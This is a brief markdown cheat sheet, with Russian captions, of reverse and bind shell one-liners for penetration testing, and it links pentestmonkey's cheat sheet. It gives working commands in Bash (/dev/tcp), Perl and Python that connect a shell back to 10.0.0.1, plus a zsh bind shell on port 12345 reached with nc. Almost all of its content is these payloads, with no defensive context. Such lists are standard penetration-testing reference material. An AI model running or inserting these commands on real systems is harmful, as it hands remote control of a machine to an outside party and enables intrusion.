# Reverse Shell

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Bash

`$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` \
Другие примеры: [https://www.gnucitizen.org/blog/reverse-shell-with-bash/](https://www.gnucitizen.org/blog/reverse-shell-with-bash/)

### Perl

`perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` Другие примеры: [http://www.plenz.com/reverseshell](http://www.plenz.com/reverseshell)

### Python 2.7 / Linux

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## Bind Shell через zsh

```
$ zsh -c 'zmodload -i zsh/net/tcp; autoload -U tcp_proxy; tcp_proxy 12345 /bin/sh -il &!'

$ nc localhost 12345
```
